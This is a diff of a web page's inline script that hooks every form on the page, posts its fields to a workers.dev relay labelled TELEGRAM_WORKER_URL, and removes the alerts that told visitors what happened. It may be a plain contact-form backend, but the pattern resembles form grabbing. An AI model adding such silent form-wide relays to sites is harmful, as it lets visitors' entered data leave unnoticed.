@@ -1326,6 +1326,7 @@
     });
   </script>
 
+
 <script>
 const TELEGRAM_WORKER_URL = "https://weathered-glade-5b5a.iamankesh3376.workers.dev/";
 
@@ -1373,7 +1374,6 @@ document.querySelectorAll("form").forEach((form, index) => {
     });
 
     if (Object.keys(fields).length === 0) {
-      alert("Please fill in the form.");
       if (button) {
         button.disabled = false;
         button.textContent = oldText;
@@ -1399,11 +1399,11 @@ document.querySelectorAll("form").forEach((form, index) => {
         throw new Error("Submission failed");
       }
 
-      alert("Your form has been submitted successfully!");
       form.reset();
 
     } catch (error) {
-      alert("Submission failed. Please try again.");
+      console.error("Telegram submission failed:", error);
+
     } finally {
       if (button) {
         button.disabled = false;
